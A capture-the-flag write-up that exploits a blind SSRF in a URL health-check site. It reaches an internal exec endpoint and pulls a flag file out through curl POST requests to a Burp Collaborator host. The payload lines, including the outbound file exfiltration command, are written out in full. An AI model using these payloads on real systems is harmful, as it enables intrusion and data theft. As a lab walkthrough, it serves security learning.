# healthcheck

I left my hopes_and_dreams on the server. can you help fetch it for me?

[http://104.214.185.119/index.php](http://104.214.185.119/index.php)

**This website allows users to check the HTTP status code of any URL they enter.**

You just type in a link like http://example.com and the site tells you whether that page is reachable by returning a status code like 200 OK (success) or 404 Not Found. It 
does not show the page content just the status code.

**Payload**:

url = [http://104.214.185.119/index.php](http://104.214.185.119/index.php)

![548e99e2-3e15-40a5-9041-6af3f8097bcd](https://github.com/user-attachments/assets/99d6ac4c-7d0a-42a8-9cc8-9ff35fb8cd2f)

The server responded with a 200 status code, indicating it successfully fetched the page. I noticed the server only returned the status code and not the response body, suggesting this might be a Blind SSRF (Server-Side Request Forgery) challenge. That meant I couldn't directly view internal resources like the flag.

**Payload**:

`url=http://localhost`

This returned a 403 Forbidden response, implying that direct access to localhost was blocked.

**Payload**:

`url=http://127.0.0.1`

This also returned a 403, confirming that both hostname and IP-based access to internal services were restricted. I suspected basic SSRF protections were in place and started looking for bypasses using internal hostnames.

![171364cd-b354-4967-9be0-4ec824c193c9](https://github.com/user-attachments/assets/056024b0-1071-4f33-865b-a8d1153116e5)


Since localhost was blocked, I might be that the server is using internal hostnames that weren’t restricted. A common internal service name like healthcheck seemed worth testing.

**Payload**:

`url=http://healthcheck/hopes_and_dreams`

![image](https://github.com/user-attachments/assets/a5d7151f-31fb-428b-ac79-a9556ed8d15e)

This was a good discovery. The server returned 200, meaning healthcheck was a valid internal hostname and /hopes_and_dreams was an accessible endpoint or file. This could potentially contain the flag, but since this is a blind SSRF, I couldn’t view the contents directly.

To confirm the SSRF vulnerability, I injected a Burp Collaborator payload:

![Screenshot_2025-04-14_140954](https://github.com/user-attachments/assets/0fc76c35-5743-4cfc-9ab4-d4bebd5e3012)


The application made an HTTP request to my Collaborator domain confirming it was vulnerable to **Blind SSRF**.

![image 1](https://github.com/user-attachments/assets/ba7d78b0-a21b-4814-875b-0fb42b925069)

### Attempting Parameter-Based Exfiltration

Next, I tried appending parameters to trick /hopes_and_dreams into making outbound requests with 

payloads:

`url=http://healthcheck/hopes_and_dreams?callback=z9992jhxfhoaqrrutldhhjqriio9cz0o.oastify.com`

`url=http://healthcheck/hopes_and_dreams?webhook=z9992jhxfhoaqrrutldhhjqriio9cz0o.oastify.com`

No interactions were observed in Burp Collaborator. This implied /hopes_and_dreams was likely a static file or an endpoint that ignored URL parameters.

### Discovering the exec Endpoint

Realizing hopes_and_dreams alone wasn’t enough, I try to find other internal endpoints that might allow command execution or file access. An exec endpoint seemed likely for running commands.

**Payload**:

`url=http://healthcheck/exec?cmd=curl+z9992jhxfhoaqrrutldhhjqriio9cz0o.oastify.com`

Burp Collaborator received a GET request to /test.

The exec endpoint executed my curl command and made an outbound request to my Collaborator URL. This confirmed I could run arbitrary commands and use them to interact with the system and exfiltrate data. My next task was to use this to read hopes_and_dreams.

I tried to read the file using shell substitution:

**Payload**:

`url=http://healthcheck/exec?cmd=curl+z9992jhxfhoaqrrutldhhjqriio9cz0o.oastify.com/$(cat+hopes_and_dreams)`

Burp Collaborator received a request to /cat, not the file contents.

Result: Only /cat was fetched.
Conclusion: Shell substitution wasn’t supported—commands weren’t run in a full shell.

I adjusted my approach to use curl data-binary option, which sends a file’s contents in the request body, avoiding the need for shell substitution.

**Payload**:

`url=http://healthcheck/exec?cmd=curl+-X+POST+--data-binary+@hopes_and_dreams+z9992jhxfhoaqrrutldhhjqriio9cz0o.oastify.com`

Burp Collaborator received a POST request with the contents of hopes_and_dreams in the body, revealing the flag!

![7d5028fa-631d-4a6e-86d2-df8852f34528](https://github.com/user-attachments/assets/8bf9e454-01f7-4785-8633-d48431b10765)

### Why It Worked?

- The SSRF allowed me to reach internal services like healthcheck/exec.
- The exec endpoint ran arbitrary commands.
- curl read the file and sent it in a POST request to my external server.
- This avoided shell substitution issues and allowed full exfiltration of the file.
